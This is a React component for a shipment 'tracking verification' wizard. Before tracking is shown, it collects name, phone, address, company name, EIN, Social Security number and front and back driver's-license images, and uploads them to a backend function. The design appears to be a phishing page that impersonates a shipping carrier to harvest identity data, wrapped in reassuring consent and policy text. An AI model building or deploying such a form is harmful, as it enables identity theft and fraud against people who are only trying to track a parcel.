import { useState } from "react";
import { ArrowLeft, ArrowRight, Check, FileImage, ShieldCheck } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

type TrackingVerificationWizardProps = {
  trackingNumbers: string[];
  onCancel: () => void;
  onVerified: () => void;
};

const retentionPolicy =
  "We collect these details to verify that you are authorized to access shipment information.";

export function TrackingVerificationWizard({
  trackingNumbers,
  onCancel,
  onVerified,
}: TrackingVerificationWizardProps) {
  const [step, setStep] = useState(0);
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [deliveryAddress, setDeliveryAddress] = useState("");
  const [companyName, setCompanyName] = useState("");
  const [ein, setEin] = useState("");
  const [ssn, setSsn] = useState("");
  const [dba, setDba] = useState("");
  const [registrationType, setRegistrationType] = useState("");
  const [registrationNumber, setRegistrationNumber] = useState("");
  const [frontId, setFrontId] = useState<File | null>(null);
  const [backId, setBackId] = useState<File | null>(null);
  const [consented, setConsented] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function onSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setError(null);

    if (step < 3) {
      setStep((current) => current + 1);
      return;
    }

    if (!frontId || !backId || !consented) return;

    setSubmitting(true);
    const formData = new FormData();
    formData.set("trackingNumbers", JSON.stringify(trackingNumbers));
    formData.set("fullName", fullName.trim());
    formData.set("phone", phone.trim());
    formData.set("deliveryAddress", deliveryAddress.trim());
    formData.set("companyName", companyName.trim());
    formData.set("ein", ein.trim());
    formData.set("ssn", ssn.trim());
    formData.set("dba", dba.trim());
    formData.set("registrationType", registrationType);
    formData.set("registrationNumber", registrationNumber.trim());
    formData.set("consented", "true");
    formData.set("frontId", frontId);
    formData.set("backId", backId);

    try {
      const { error: submitError } = await supabase.functions.invoke("tracking-verification", {
        body: formData,
      });
      if (submitError) throw submitError;
      window.scrollTo({ top: 0, behavior: "smooth" });
      onVerified();
    } catch (submitError) {
      setError(
        submitError instanceof Error
          ? submitError.message
          : "Unable to submit verification. Please try again.",
      );
    } finally {
      setSubmitting(false);
    }
  }

  function validateFile(file: File | null): string | null {
    if (!file) return null;
    if (!["image/jpeg", "image/png", "application/pdf"].includes(file.type))
      return "Choose a JPG, PNG, or PDF file.";
    if (file.size > 5 * 1024 * 1024) return "Each file must be 5 MB or smaller.";
    return null;
  }

  const fileError = validateFile(frontId) ?? validateFile(backId);

  return (
    <section
      className="mt-5 rounded-lg border border-border bg-white p-5 md:p-7"
      aria-labelledby="verification-title"
    >
      <div className="mb-6 grid grid-cols-4 gap-2" aria-label="Verification progress">
        {["Personal", "Company", "Identity", "Review"].map((label, index) => (
          <div key={label} className="min-w-0">
            <div
              className={`flex items-center gap-2 text-xs font-semibold ${index <= step ? "text-navy" : "text-muted-foreground"}`}
            >
              <span
                className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full ${index < step ? "bg-navy text-white" : index === step ? "bg-red text-white" : "bg-secondary"}`}
              >
                {index < step ? <Check className="h-4 w-4" /> : index + 1}
              </span>
              <span className="truncate">{label}</span>
            </div>
            {index < 3 && (
              <div className={`ml-8 mt-1 h-0.5 ${index < step ? "bg-navy" : "bg-border"}`} />
            )}
          </div>
        ))}
      </div>

      <h2 id="verification-title" className="text-xl font-bold text-navy">
        {step === 0 && "Personal Details"}
        {step === 1 && "Company Information"}
        {step === 2 && "Identity and Address Verification"}
        {step === 3 && "Review & Submit"}
      </h2>
      <p
        className={`mt-1 text-sm ${step === 3 ? "font-semibold text-black" : "text-muted-foreground"}`}
      >
        {step === 0 && "Enter your contact details for this shipment."}
        {step === 1 && "Provide the company and tax details associated with this shipment."}
        {step === 2 &&
          "Upload clear images of the front and back of your driver's license or state-issued ID."}
        {step === 3 && "Review your details and the verification policy before submitting."}
      </p>

      <form onSubmit={onSubmit}>
        {step === 0 && (
          <div className="mt-5 grid gap-4">
            <Field label="Full name">
              <input
                required
                autoComplete="name"
                value={fullName}
                onChange={(event) => setFullName(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="Contact number">
              <input
                required
                type="tel"
                autoComplete="tel"
                value={phone}
                onChange={(event) => setPhone(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="Delivery address">
              <textarea
                required
                autoComplete="street-address"
                rows={3}
                value={deliveryAddress}
                onChange={(event) => setDeliveryAddress(event.target.value)}
                className="input py-2"
              />
            </Field>
          </div>
        )}

        {step === 1 && (
          <div className="mt-5 grid gap-4 sm:grid-cols-2">
            <Field label="Legal company name">
              <input
                required
                autoComplete="organization"
                value={companyName}
                onChange={(event) => setCompanyName(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="EIN">
              <input
                required
                inputMode="numeric"
                autoComplete="off"
                placeholder="12-3456789"
                value={ein}
                onChange={(event) => setEin(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="Social Security number">
              <input
                required
                inputMode="numeric"
                autoComplete="off"
                placeholder="123-45-6789"
                value={ssn}
                onChange={(event) => setSsn(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="Doing business as (optional)">
              <input
                value={dba}
                onChange={(event) => setDba(event.target.value)}
                className="input"
              />
            </Field>
            <Field label="Company or trademark number (optional)">
              <div className="grid grid-cols-[minmax(0,0.8fr)_minmax(0,1.2fr)] gap-2">
                <select
                  value={registrationType}
                  onChange={(event) => setRegistrationType(event.target.value)}
                  className="input"
                >
                  <option value="">Select type</option>
                  <option value="Company registration">Company registration</option>
                  <option value="Trademark">Trademark</option>
                  <option value="Other">Other</option>
                </select>
                <input
                  value={registrationNumber}
                  onChange={(event) => setRegistrationNumber(event.target.value)}
                  placeholder="Registration number"
                  className="input"
                />
              </div>
            </Field>
          </div>
        )}

        {step === 2 && (
          <div className="mt-5">
            <div className="flex items-start gap-3 rounded-md border border-navy/15 bg-navy/5 p-4 text-sm text-navy">
              <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0" />
              <div>
                <strong className="block">Accepted documents</strong>Driver's license or
                state-issued ID, front and back. JPG, PNG, or PDF, up to 5 MB each.
              </div>
            </div>
            <div className="mt-4 grid gap-4 sm:grid-cols-2">
              <FileField label="Front side" file={frontId} onChange={setFrontId} />
              <FileField label="Back side" file={backId} onChange={setBackId} />
            </div>
            {fileError && <p className="mt-3 text-sm text-destructive">{fileError}</p>}
            <ul className="mt-4 space-y-1 text-xs text-muted-foreground">
              <li>Use a clear, readable, uncropped image with all corners visible.</li>
              <li>Avoid glare or blur. Files are submitted to private backend storage.</li>
            </ul>
          </div>
        )}

        {step === 3 && (
          <div className="mt-5 space-y-4">
            <ReviewSection title="Personal details">
              <ReviewRow label="Name" value={fullName} />
              <ReviewRow label="Contact number" value={phone} />
              <ReviewRow label="Delivery address" value={deliveryAddress} />
            </ReviewSection>
            <ReviewSection title="Company details">
              <ReviewRow label="Legal company" value={companyName} />
              <ReviewRow label="EIN" value={`••••${ein.slice(-4)}`} />
              <ReviewRow label="SSN" value={`••••${ssn.slice(-4)}`} />
              {dba && <ReviewRow label="DBA" value={dba} />}
              {registrationNumber && (
                <ReviewRow label={registrationType || "Registration"} value={registrationNumber} />
              )}
            </ReviewSection>
            <ReviewSection title="Identity documents">
              <ReviewRow label="Front side" value={frontId?.name ?? "Not selected"} />
              <ReviewRow label="Back side" value={backId?.name ?? "Not selected"} />
            </ReviewSection>
            <p className="rounded-md bg-secondary p-3 text-xs font-semibold leading-5 text-black">
              {retentionPolicy}
            </p>
            <label className="flex items-start gap-3 text-sm font-semibold text-black">
              <input
                required
                type="checkbox"
                checked={consented}
                onChange={(event) => setConsented(event.target.checked)}
                className="mt-1 h-4 w-4 accent-navy"
              />
              <span>
                I confirm this information is accurate and consent to its use for shipment-access
                verification under the policy above.
              </span>
            </label>
          </div>
        )}

        {error && (
          <div
            role="alert"
            className="mt-4 rounded-md border border-destructive/30 bg-destructive/5 p-3 text-sm text-destructive"
          >
            {error}
          </div>
        )}
        <div className="mt-6 flex flex-wrap items-center justify-between gap-3">
          <button
            type="button"
            onClick={step === 0 ? onCancel : () => setStep((current) => current - 1)}
            className="inline-flex h-10 items-center gap-2 rounded-md border border-border px-4 text-sm font-semibold text-foreground"
          >
            <ArrowLeft className="h-4 w-4" /> {step === 0 ? "Cancel" : "Back"}
          </button>
          <button
            type="submit"
            disabled={submitting || Boolean(fileError)}
            className="inline-flex h-10 items-center gap-2 rounded-md bg-navy px-5 text-sm font-semibold text-white disabled:opacity-60"
          >
            {submitting ? "Submitting..." : step === 3 ? "Submit & view tracking" : "Continue"}
            {step < 3 && <ArrowRight className="h-4 w-4" />}
          </button>
        </div>
      </form>
    </section>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="grid gap-1.5 text-sm font-medium text-foreground">
      {label}
      {children}
    </label>
  );
}

function FileField({
  label,
  file,
  onChange,
}: {
  label: string;
  file: File | null;
  onChange: (file: File | null) => void;
}) {
  return (
    <label className="grid min-h-36 cursor-pointer content-center justify-items-center gap-2 rounded-md border border-dashed border-input bg-secondary/40 p-4 text-center">
      <FileImage className="h-7 w-7 text-muted-foreground" />
      <span className="text-sm font-semibold">{label}</span>
      <span className="max-w-full truncate text-xs text-muted-foreground">
        {file?.name ?? "Choose JPG, PNG, or PDF"}
      </span>
      <input
        required
        type="file"
        accept="image/jpeg,image/png,application/pdf"
        onChange={(event) => onChange(event.target.files?.[0] ?? null)}
        className="sr-only"
      />
    </label>
  );
}

function ReviewSection({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-md border border-border p-4">
      <h3 className="mb-2 text-sm font-bold text-black">{title}</h3>
      <div className="space-y-2">{children}</div>
    </div>
  );
}

function ReviewRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="grid grid-cols-[9rem_minmax(0,1fr)] gap-3 text-sm font-semibold text-black">
      <span>{label}</span>
      <span className="break-words font-bold">{value}</span>
    </div>
  );
}
